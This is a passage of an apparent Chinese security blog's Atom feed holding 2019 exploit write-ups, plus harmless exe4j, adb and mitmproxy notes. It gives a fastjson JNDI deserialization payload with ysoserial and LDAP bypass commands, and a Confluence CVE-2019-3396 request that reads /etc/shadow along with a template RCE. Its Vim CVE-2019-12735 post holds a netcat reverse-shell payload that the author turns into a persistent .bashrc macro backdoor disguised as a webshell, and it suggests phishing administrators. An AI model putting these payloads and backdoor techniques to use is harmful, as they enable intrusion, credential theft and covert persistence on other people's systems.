      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="xstream" scheme="http://yoursite.com/tags/xstream/"/>
    
  </entry>
  
  <entry>
    <title>fastjson的RCE漏洞复现记录</title>
    <link href="http://yoursite.com/2019/07/13/fastjson%E7%9A%84RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2019/07/13/fastjson的RCE漏洞复现记录/</id>
    <published>2019-07-13T04:21:30.000Z</published>
    <updated>2019-09-09T12:14:32.968Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-关于fastjson"><a href="#0x00-关于fastjson" class="headerlink" title="0x00 关于fastjson"></a>0x00 关于fastjson</h2><p>反正是阿里巴巴的一个开源json库，java站都爱用，还有比如Jackson、gson什么的，Jackson也有RCE问题。fastjson主要几次问题都在于autotype，其实我也不太懂autotype，可能@type的形式就叫aotutype吧。<br>关于开关fastjson的autotype以及白名单配置<a href="https://github.com/alibaba/fastjson/wiki/enable_autotype" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/wiki/enable_autotype</a></p><h2 id="0x01-关于反序列化"><a href="#0x01-关于反序列化" class="headerlink" title="0x01 关于反序列化"></a>0x01 关于反序列化</h2><p>之前的autotype存在反序列化的问题，48版本后又多了个绕过autotype设置的问题，以至于不管你是否开启autotype，使用@type都可以触发反序列化，目前的修复方案好像也只是优化了黑名单，并没有从本质上解决这个问题。<br>目前出问题的是java.lang.Class可以构造出其他的反序列化利用链，而因为种种问题参考<a href="https://bithack.io/forum/393" target="_blank" rel="noopener">fastjson漏洞分析</a>，<a href="http://xz.aliyun.com/t/5680" target="_blank" rel="noopener">http://xz.aliyun.com/t/5680</a>可以绕过黑名单和autotypesuport的校验。</p><h2 id="0x02-payload"><a href="#0x02-payload" class="headerlink" title="0x02 payload"></a>0x02 payload</h2><p><code>{&quot;name&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;x&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:1099/Exploit&quot;,&quot;autoCommit&quot;:true}}}</code><br>本次利用的形式如上，后面的利用链可以更换成以前的其他类似的payload均可以，因此有很多种变种。<br>将下面这个github里的历史payload改造成上面这种就好了<a href="https://github.com/shengqi158/fastjson-remote-code-execute-poc" title="github历史payload" target="_blank" rel="noopener">github历史payload</a></p><h2 id="0x03-一些利用"><a href="#0x03-一些利用" class="headerlink" title="0x03 一些利用"></a>0x03 一些利用</h2><p>利用的思路可以看看这个文章<a href="https://www.cnblogs.com/hac425/p/9800288.html" target="_blank" rel="noopener">fastjson利用总结</a>，思路是差不多的，具体payload参考上面那个github改一改，这文章里有个直接执行命令的利用方法可以关注一下（意思是不需要搭建rmi和ldap的那种）<br>新增：</p><ol><li>fastjson\&lt;1.2.58版本的新的利用链<a href="https://github.com/mikuKeeper/CVE-2019-12384" target="_blank" rel="noopener">https://github.com/mikuKeeper/CVE-2019-12384</a>该利用链同样适用于Jackson，不如说本来也就是Jackson那边爆出来的<h2 id="0x04-利用的时候一些重点注意事项"><a href="#0x04-利用的时候一些重点注意事项" class="headerlink" title="0x04 利用的时候一些重点注意事项"></a>0x04 利用的时候一些重点注意事项</h2></li><li>利用的时候其实会受到目标使用的jdk版本影响，如果要绕过jdk版本的话需要利用的绕过方法也受到目标是否存在对应利用链的问题</li><li>利用的时候ldap和rmi其实一定程度上是等价的，建议使用ldap</li><li>利用的时候ldap能收到目标发送的请求但是没有通过reference请求到web服务获取exploit.class的原因就是前面说的jdk版本问题</li><li>ldap收到了请求就可以认为目标存在fastjson漏洞，至于能不能饶过版本限制就是后面的事情了，可以根据这个特性做个批量检测工具</li><li>关于版本饶过的详细总结可以看这个<a href="https://www.freebuf.com/column/207439.html" target="_blank" rel="noopener">饶过jdk版本限制</a></li><li>貌似在未开启autotypesuport配置情况下，需要发两次请求触发缓存</li><li>利用时候的exp本身也需要满足jdk版本要求，比较简单的做法是使用jdk6来生成exp</li></ol><h2 id="0x05关于测试环境"><a href="#0x05关于测试环境" class="headerlink" title="0x05关于测试环境"></a>0x05关于测试环境</h2><p>测试环境可以使用vulhub的fastjson环境，该环境目前已知有两个问题：</p><ol><li>centos7可能会出现docker build失败的问题，rm命令执行错误，换个ubuntu就好了</li><li>该环境的jdk版本也是过高导致有限制，因此会导致无法触发reference的http请求从而命令执行问题，饶过参考上面，或者换个jdk版本</li></ol><p>关于服务搭建，建议不要搭建rmi服务，因为目前看来和ldap等价，而ldap服务具有饶过的可能，因此直接使用ldap就好了。如果使用饶过则需要修改ladp服务器的部分代码，依旧是参考上面饶过的那篇文章最后提到的那段。<a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/tree/master/PoC" target="_blank" rel="noopener">bypass的github</a><br>关于代码修改后的编译问题：</p><ol><li>mvn compile   会生产class文件，会产生不带依赖的jar包</li><li>mvn install  不仅会生产class还会生产jar和带依赖的jar</li><li>如果部分版本冲突可以尝试修改pom文件里的版本信息</li><li>java -cp Jar 包地址 person.server.LdapServer 就可以启动ldap服务，这个是通过编译的来的jar包里的class启动的server，通过marshalsec的话也是启动的marshalsec包里的ldap服务</li></ol><h2 id="0x06-扩展"><a href="#0x06-扩展" class="headerlink" title="0x06 扩展"></a>0x06 扩展</h2><p>由于饶过姿势太多，后续可能考虑编写一个统一的检测工具，依赖于修改ldap服务器使其针对不同的请求返回不同的利用链payload，依照这个思路来做检测。</p><h2 id="0x07-关于java反序列化"><a href="#0x07-关于java反序列化" class="headerlink" title="0x07 关于java反序列化"></a>0x07 关于java反序列化</h2><p>几个工具可以看一下</p><ol><li><a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener"> marshalsec </a></li><li><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener"> ysoserial </a><br>Java反序列化备忘录文章<a href="https://xz.aliyun.com/t/2042" target="_blank" rel="noopener">备忘录</a><br><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">javaruntime.exec payload生成</a><br>KM29Nw2ydMpJ8kRz</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 ‘命令' |base64 | sed ':t;N;s/\n//;b t'&gt; tmp1</span><br></pre></td></tr></table></figure><p>//生成基于commonscollections6的payload<br>启动通过返回属性触发gadget的绕过方式的ldap：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp  fastjson-poc-1.0-SNAPSHOT-jar-with-dependencies.jar  person.server.ldap_bypass_jdklimit.Ldap_javaSerializedData http://papa.mikudapangcin:11111/#Exploit 389</span><br></pre></td></tr></table></figure></p><p>可以通过生成多个gadget来绕过限制</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-关于fastjson&quot;&gt;&lt;a href=&quot;#0x00-关于fastjson&quot; class=&quot;headerlink&quot; title=&quot;0x00 关于fastjson&quot;&gt;&lt;/a&gt;0x00 关于fastjson&lt;/h2&gt;&lt;p&gt;反正是阿里巴巴的一个开源json库，
      
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="fastjson" scheme="http://yoursite.com/tags/fastjson/"/>
    
  </entry>
  
  <entry>
    <title>exe4j生成的exe文件反编译记录</title>
    <link href="http://yoursite.com/2019/06/25/exe4j%E7%94%9F%E6%88%90%E7%9A%84exe%E6%96%87%E4%BB%B6%E5%8F%8D%E7%BC%96%E8%AF%91%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2019/06/25/exe4j生成的exe文件反编译记录/</id>
    <published>2019-06-25T09:40:30.000Z</published>
    <updated>2019-06-25T11:26:30.440Z</updated>
    
    <content type="html"><![CDATA[<h2 id="exe4j"><a href="#exe4j" class="headerlink" title="exe4j"></a>exe4j</h2><p>Exe4j是一款经典的讲java程序打包成一个exe程序的软件，没什么其他好说的。</p><h2 id="识别是否exe4j"><a href="#识别是否exe4j" class="headerlink" title="识别是否exe4j"></a>识别是否exe4j</h2><p>我是通过程序中报错信息打印出的堆栈信息中含有exe4j包名来判断的，也可以直接通过下面提供的程序处理一下后看看生成的文件能不能用zip解压出java类来判断。</p><h2 id="exe4j逆向处理程序代码"><a href="#exe4j逆向处理程序代码" class="headerlink" title="exe4j逆向处理程序代码"></a>exe4j逆向处理程序代码</h2><p>直接贴出代码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import java.util.*;</span><br><span class="line">import java.io.*;</span><br><span class="line">public class gen &#123;</span><br><span class="line">    public static void main(String args[]) throws IOException &#123;</span><br><span class="line">        FileInputStream fin = new FileInputStream(args[0]);</span><br><span class="line">        FileOutputStream fout = new FileOutputStream(args[1]);</span><br><span class="line">        BufferedInputStream bin = new BufferedInputStream(fin);</span><br><span class="line">        BufferedOutputStream bout = new BufferedOutputStream(fout);</span><br><span class="line">        int in = 0;</span><br><span class="line">        do &#123;</span><br><span class="line">            in = bin.read();</span><br><span class="line">            if (in == -1)</span><br><span class="line">                break;</span><br><span class="line">            in ^= 0x88;</span><br><span class="line">            bout.write(in);</span><br><span class="line">        &#125; while (true);</span><br><span class="line">        bin.close();</span><br><span class="line">        fin.close();</span><br><span class="line">        bout.close();</span><br><span class="line">        fout.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ol><li><p>将这个程序保存为gen.java，名字不可以改，通过以下命令来编译：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac gen.java</span><br><span class="line">java gen.class 需要转换的exe文件名 转换后的输出文件名</span><br></pre></td></tr></table></figure></li><li><p>使用zip解压软件直接解压输出的文件</p></li><li>正常解压后会出现java类文件，拖入jd-gui里就可以按照java逆向来走了</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;exe4j&quot;&gt;&lt;a href=&quot;#exe4j&quot; class=&quot;headerlink&quot; title=&quot;exe4j&quot;&gt;&lt;/a&gt;exe4j&lt;/h2&gt;&lt;p&gt;Exe4j是一款经典的讲java程序打包成一个exe程序的软件，没什么其他好说的。&lt;/p&gt;
&lt;h2 id=&quot;识别是否
      
    
    </summary>
    
      <category term="客户端逆向" scheme="http://yoursite.com/categories/%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%80%86%E5%90%91/"/>
    
    
      <category term="exe4j程序逆向" scheme="http://yoursite.com/tags/exe4j%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>基于VIM宏的后门-深入利用VIM漏洞CVE-2019-12735</title>
    <link href="http://yoursite.com/2019/06/20/%E5%9F%BA%E4%BA%8EVIM%E5%AE%8F%E7%9A%84%E5%90%8E%E9%97%A8-%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8VIM%E6%BC%8F%E6%B4%9ECVE-2019-12735/"/>
    <id>http://yoursite.com/2019/06/20/基于VIM宏的后门-深入利用VIM漏洞CVE-2019-12735/</id>
    <published>2019-06-20T07:40:30.000Z</published>
    <updated>2019-06-25T11:35:42.951Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00 引言"></a>0x00 引言</h2><p>作为一个vim多年使用者，前两天得知爆出个VIM的RCE漏洞搞的我有点害怕，因此特意对这个漏洞的利用进行了一些研究。由于本人是个菜的抠脚的脚本小子，因此并不会在这篇文章中去给大家解释漏洞原因，作为脚本小子我只关心如何利用。至于漏洞原因的一些解释可以去原作者的git上去看<a href="https://github.com/numirias/security/blob/master/doc/2019-06-04%5C_ace-vim-neovim.md" title="原作者GITHUB" target="_blank" rel="noopener">原作者GITHUB</a></p><h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><p>先讲一下如何漏洞复现，复现该漏洞的基本条件是：</p><ol><li>Vim版本在影响范围内，目前大部分版本都有受影响，至少我最近开启的GCP上的ubuntu默认的vim版本在8.0左右是受影响的。</li><li>必须开启modeline选项，这个选项很关键，我的GCP上默认是不开启的，所以严重降低了该漏洞的危害，不太确定低版本或者是一些衍生版本的vim会不会默认开启。</li></ol><h3 id="复现poc1过程："><a href="#复现poc1过程：" class="headerlink" title="复现poc1过程："></a>复现poc1过程：</h3><ol><li>在～/.vimrc中加入set modeline确保开启该选项<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2. 使用原作者的第一个poc直接写入一个文件并保存：\`:!uname -a||" vi:fen:fdm=expr:fde=assertfails("source\!\ \%"):fdl=0:fdt="</span><br></pre></td></tr></table></figure></li></ol><p>`3. 然后使用vim打开该文件，如果受影响就会执行打印uname -a的结果，如果不受影响就是一个普通的文本</p><h3 id="复现poc2过程："><a href="#复现poc2过程：" class="headerlink" title="复现poc2过程："></a>复现poc2过程：</h3><p>先来看看原作者在git上写着的poc2:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x1b\[?7l\x1bSNothing here.\x1b:silent! w | call system(\'nohup nc 127.0.0.1 9999 -e /bin/sh &amp;\') | redraw! | file | silent! # " vim: set fen fdm=expr fde=assert\_fails(\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\') fdl=0: \x16\x1b\[1G\x16\x1b\[KNothing here."\x16\x1b\[D \\n</span><br></pre></td></tr></table></figure></p><p>如果你只是检测的话可以不用看这个poc，这个poc主要是用来贴近实战的利用。我估计会有人使用这个poc1成功，但是使用poc2始终不成功，其实这个poc有几个地方需要改一下（准确来说是不能复制黏贴）：</p><ol><li>这里面涉及到的十六进制比如\x1b是需要通过二进制编辑器直接改成二进制的，复制黏贴是不行的。将poc中所有的十六进制位置编辑成二进制即可。</li><li>反斜杠的问题，原poc中作者为了转义特殊符号来显示所以多加了反斜杠，将所有涉及到转义的字符前面多一个的反斜杠“\”去掉就可以了</li><li>必要的话将最后的\n直接改成回车，如果\n在你的文本里没有被解释成回车的话</li></ol><p>按照上面说的流程修改完poc后，我们在测试机本地起个nc监听：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 9999</span><br></pre></td></tr></table></figure></p><p>最后打开poc2即可看到nc获取到了反弹链接。</p><h2 id="0x02-改造poc2加入宏后门"><a href="#0x02-改造poc2加入宏后门" class="headerlink" title="0x02 改造poc2加入宏后门"></a>0x02 改造poc2加入宏后门</h2><p>先来说说为什么要加入宏后门，poc2中有个问题，就是当vim打开一次文档后，就不会在携带有恶意代码了从而变成一个普通文档。虽然我们可以通过第一次建立连接后下载木马来获得持久的后门，但这个方式不在讨论范围内了。这里我的想法是先实现每次打开文档都会获得反弹链接的持久后门，而不是依赖于下载外部木马。<br>Poc2其实加了很多代码用来伪装成正常文件内容，使人即使打开文件也不会察觉到里面藏有恶意代码，而poc1则会很明显看到代码执行。这个伪装有几个特点：</p><ol><li>受影响版本的vim和cat打开都不会显示插入的恶意代码</li><li>cat -v可以看到恶意代码</li><li>不同版本的cat可能会看到一些显示的差异，但是恶意代码依旧是看不到的</li></ol><p>为了不破坏伪装同时做成可持续的后门，比较菜的我只想到了利用vim宏来达到这个效果。</p><h3 id="基本实现思路"><a href="#基本实现思路" class="headerlink" title="基本实现思路"></a>基本实现思路</h3><p>首先，我们希望的是每次vim文件都会执行代码，那么有没有可能使其每次vim文件的时候都执行一边vim宏呢？这是可能的，过程如下：</p><ol><li>在vim窗口录制宏：q{寄存器名称}，录制完成后再按下q按键停止</li><li>在～/.bashrc中写入alias vim=vim -c ‘@{寄存器名称}’ 以及shopt -s expand_aliases，通过alias替换vim别名的方式来打开文件默认执行宏</li><li>那么只要管理员重新登录shell，以后不管他vim什么文件都会执行我们写在宏里的命令</li></ol><p>接下来要做的就是在poc2中合适的地方加入录制宏的命令，其实poc2中那些十六进制比如\x1b是ESC的意思，可以联想到这个应该是vim中切换模式的按键，因此我们可以通过在ESC之后需要执行的命令之前加入qy来开始录制宏y，在命令执行完后某个合适的位置加入q来终止宏的录制。在试了很多次后最终有了以下exp：<br><a href="https://github.com/mikuKeeper/security/blob/master/data/2019-06-04%5C_ace-vim-neovim/%E5%AE%8F%E5%90%8E%E9%97%A8%5C_%E6%AD%A3%E5%B8%B8%E7%89%88vim%5C_CVE-2019-12735.txt" title="exp1" target="_blank" rel="noopener">后门exp1</a></p><h3 id="进一步优化"><a href="#进一步优化" class="headerlink" title="进一步优化"></a>进一步优化</h3><p>上面那个poc依旧存在几个问题：</p><ol><li>每次执行都会疯狂的往bashrc里插入alias那两句，只要vim一次就插一次，这很不好</li><li>没有伪装成正常文件内容</li></ol><p>为了改善第一个问题，我们可以通过分开执行两次命令，然后宏只录制第一个命令（即反弹shell），第二个插入命令只执行一次。这听起来很容易，其实做起来并不容易……多次执行会遇到很多问题，因为我太菜了所以花了很长的时间。<br>改善第二个问题，其实也远远没有想的那么简单，以为只是在空白处插入文本即可，其实不是的，原poc中的命令会对这些文本产生影响，所以写入什么样的文本都还是有点考究的。<br>这边给出一个最终将这两个问题都解决了并且伪装成一个PHP一句话的案例：<br><a href="https://github.com/mikuKeeper/security/blob/master/data/2019-06-04%5C_ace-vim-neovim/%E5%AE%8F%E5%90%8E%E9%97%A8%5C_webshell%E4%BC%98%E5%8C%96%E7%89%88%5C_vim%5C_CVE-2019-12735.txt" title="伪装成webshell版本" target="_blank" rel="noopener">后门exp2</a><br>最后还有个vim历史命令里会残留执行的命令的问题，这个可以通过插入一些垃圾vim命令来伪装。</p><h2 id="0x03-思考总结"><a href="#0x03-思考总结" class="headerlink" title="0x03 思考总结"></a>0x03 思考总结</h2><p>考虑到这个漏洞需要开启modeline选项，所以危害严重降低。不过还是可以通过钓鱼来碰运气的，因为你说不好就有生产环境的vim开了这个。假设他们开了那么这个就会成为一个Linux上类似于win上的点击病毒，只要vim了就会中招，而且会随着原文件的copy同步来扩大。还有一些mbp用户也会中招，比如你在网上散播伪装成nginx.conf的文件，诱导那些可怜的开发者来下载使用。<br>甚至于我们可以伪装成一个一句话木马上传到目标站点，至于他能不能执行都不重要，直接发邮件给管理员伪装成安全公司来告知他们扫描发现木马，建议他们通过vim打开文件确认后删除……<br>总之开开脑洞还是可能有利用场景的，不过我个人认为吧，没错这个漏洞就是鸡肋玩具！<br>最后如果有朋友知道具体哪些版本和可能的场景下vim会默认打开modeline选项，还请告知谢谢啦。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-引言&quot;&gt;&lt;a href=&quot;#0x00-引言&quot; class=&quot;headerlink&quot; title=&quot;0x00 引言&quot;&gt;&lt;/a&gt;0x00 引言&lt;/h2&gt;&lt;p&gt;作为一个vim多年使用者，前两天得知爆出个VIM的RCE漏洞搞的我有点害怕，因此特意对这个漏洞的利用
      
    
    </summary>
    
      <category term="客户端安全" scheme="http://yoursite.com/categories/%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CVE-2019-12735" scheme="http://yoursite.com/tags/CVE-2019-12735/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-3396：confluence任意文件读取与RCE漏洞复现</title>
    <link href="http://yoursite.com/2019/04/08/CVE-2019-3396%EF%BC%9Aconfluence%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8ERCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/04/08/CVE-2019-3396：confluence任意文件读取与RCE漏洞复现/</id>
    <published>2019-04-08T11:20:18.000Z</published>
    <updated>2019-04-08T11:46:29.341Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2019-3396的相关情报"><a href="#CVE-2019-3396的相关情报" class="headerlink" title="CVE-2019-3396的相关情报"></a>CVE-2019-3396的相关情报</h1><p>详细的漏洞解析参考<a href>cve-2019-3396</a></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p>构造请求<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /rest/tinymce/1/macro/preview HTTP/1.1</span><br><span class="line">Host: confluence.xxxxxx.com</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Accept: text/html, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36</span><br><span class="line">Referer: http://confluence.xxxxx.com/pages/editpage.action?pageId=32093515</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Cookie: xxxxxxx</span><br><span class="line">Content-Type: application/json;charset=utf-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 176</span><br><span class="line"></span><br><span class="line">&#123;"contentId":"655594","macro":&#123;"name":"widget","body":"","params":&#123;"url":"https://dailymotion.com/video/xcpa64","width":"300","height":"200","_template":"file:///etc/shadow”&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>通过template参数中使用file协议可以读取服务器上的任意文件</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>由于confluence使用的是velocity模版引擎，而这个任意文件读取本身是通过渲染模版文件来读取的，因此如果模板文件里调用java对象是会被渲染执行的，具体参考下面：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#set($e="e")</span><br><span class="line">$e.getClass().forName('java.lang.System').getMethod('getProperty', $e.getClass().forName('java.lang.String')).invoke(null, 'os.name').toString()</span><br></pre></td></tr></table></figure></p><p>随意上传或者远端存储一个该内容的vm文件，然后通过上述的文件包含漏洞去包含这个模板文件即可导致RCE</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CVE-2019-3396的相关情报&quot;&gt;&lt;a href=&quot;#CVE-2019-3396的相关情报&quot; class=&quot;headerlink&quot; title=&quot;CVE-2019-3396的相关情报&quot;&gt;&lt;/a&gt;CVE-2019-3396的相关情报&lt;/h1&gt;&lt;p&gt;详细的漏洞解
      
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>安卓模拟器相关</title>
    <link href="http://yoursite.com/2019/04/08/%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%9B%B8%E5%85%B3/"/>
    <id>http://yoursite.com/2019/04/08/安卓模拟器相关/</id>
    <published>2019-04-08T09:43:21.000Z</published>
    <updated>2019-04-10T05:21:16.772Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安卓模拟器杂七杂八的记录"><a href="#安卓模拟器杂七杂八的记录" class="headerlink" title="安卓模拟器杂七杂八的记录"></a>安卓模拟器杂七杂八的记录</h2><h2 id="adb常规操作"><a href="#adb常规操作" class="headerlink" title="adb常规操作"></a>adb常规操作</h2><h4 id="adb基本操作"><a href="#adb基本操作" class="headerlink" title="adb基本操作"></a>adb基本操作</h4><p>可以参考mumu模拟器官方的文档，蛮详细的<a href>adb常规操作</a></p><h4 id="app备份"><a href="#app备份" class="headerlink" title="app备份"></a>app备份</h4><p>adb backup -f “D:\myfolder\myapp.ab” -apk \<package name\><br>adb restore “D:\myfolder\myapp.ab”</package></p><h2 id="mumu模拟器"><a href="#mumu模拟器" class="headerlink" title="mumu模拟器"></a>mumu模拟器</h2><h2 id="夜神模拟器"><a href="#夜神模拟器" class="headerlink" title="夜神模拟器"></a>夜神模拟器</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;安卓模拟器杂七杂八的记录&quot;&gt;&lt;a href=&quot;#安卓模拟器杂七杂八的记录&quot; class=&quot;headerlink&quot; title=&quot;安卓模拟器杂七杂八的记录&quot;&gt;&lt;/a&gt;安卓模拟器杂七杂八的记录&lt;/h2&gt;&lt;h2 id=&quot;adb常规操作&quot;&gt;&lt;a href=&quot;#adb常规操
      
    
    </summary>
    
      <category term=" 移动安全攻防" scheme="http://yoursite.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="Android" scheme="http://yoursite.com/tags/Android/"/>
    
      <category term="黑灰产薅羊毛" scheme="http://yoursite.com/tags/%E9%BB%91%E7%81%B0%E4%BA%A7%E8%96%85%E7%BE%8A%E6%AF%9B/"/>
    
  </entry>
  
  <entry>
    <title>MITMPROXY的摘要</title>
    <link href="http://yoursite.com/2019/04/03/MITMPROXY%E7%9A%84%E6%91%98%E8%A6%81/"/>
    <id>http://yoursite.com/2019/04/03/MITMPROXY的摘要/</id>
    <published>2019-04-03T07:40:30.000Z</published>
    <updated>2019-04-08T09:15:36.200Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MITMPROXY基本介绍"><a href="#MITMPROXY基本介绍" class="headerlink" title="MITMPROXY基本介绍"></a>MITMPROXY基本介绍</h1><p>没什么好介绍的，用过burpsuite的理解这个应该没什么难度，就是个httpproxy。主要特色是有命令行工具可以操作抓包，同时可以通过自定义python脚本来集成一些批量化请求和响应的操作比较方便。主要有mitmproxy、mitmdump、mitmweb</p><h2 id="mitmproxy"><a href="#mitmproxy" class="headerlink" title="mitmproxy"></a>mitmproxy</h2><p>Mitmproxy很简单，就是个命令行的bursuite，命令行界面操作起来有点像vim，操作的时候更多是对请求进行重新编辑后重放来实现。其他和burp类似的功能，记录各种请求和响应信息。</p><ul><li>貌似支持一个叫做key binding的功能，应该是类似于自定义快捷键和宏操作差不多的意思，主要是在它的终端中使用的。</li><li>支持通过正则配置替换规则来对内容进行替换</li><li>支持过滤，过滤语法参考<a href="https://docs.mitmproxy.org/stable/concepts-filters/" title="mitmproxy filter" target="_blank" rel="noopener">mitmproxy filter</a></li><li>似乎支持TCP代理，但是不能对TCP流进行修改</li><li>支持websocket</li><li>支持socks proxy</li><li>支持透明模式，透明模式是指在网络层进行端口重定向到proxy上，不过不能绕过证书校验（配合ssltrip进行降级可能可行）具体参考<a href="https://docs.mitmproxy.org/stable/howto-transparent/" title="mitmproxy透明模式" target="_blank" rel="noopener">mitmproxy透明模式</a><h2 id="mitmdump"><a href="#mitmdump" class="headerlink" title="mitmdump"></a>mitmdump</h2>Mitmdump与proxy不同的地方在于它可以把请求响应dump出来，并且可以通过自定义的python脚本来实现规则，通过mitmdump -s xxx.py来实现。<br>关于脚本编写的一些案例可以参考<a href="https://docs.mitmproxy.org/stable/addons-scripting/" title="mitmproxy-scripting" target="_blank" rel="noopener">mitmproxy-scripting</a><h2 id="mitmweb"><a href="#mitmweb" class="headerlink" title="mitmweb"></a>mitmweb</h2>mitmproxy的web版本<br>没有更多想说的</li></ul><h1 id="其他重点记录"><a href="#其他重点记录" class="headerlink" title="其他重点记录"></a>其他重点记录</h1><p>暂无</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MITMPROXY基本介绍&quot;&gt;&lt;a href=&quot;#MITMPROXY基本介绍&quot; class=&quot;headerlink&quot; title=&quot;MITMPROXY基本介绍&quot;&gt;&lt;/a&gt;MITMPROXY基本介绍&lt;/h1&gt;&lt;p&gt;没什么好介绍的，用过burpsuite的理解这个应该
      
    
    </summary>
    
      <category term="爬虫" scheme="http://yoursite.com/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="http抓包" scheme="http://yoursite.com/tags/http%E6%8A%93%E5%8C%85/"/>
    
      <category term="MITMPROXY" scheme="http://yoursite.com/tags/MITMPROXY/"/>
    
  </entry>
  
  <entry>
    <title>bilibili子域名根目录挂黑页问题记录</title>
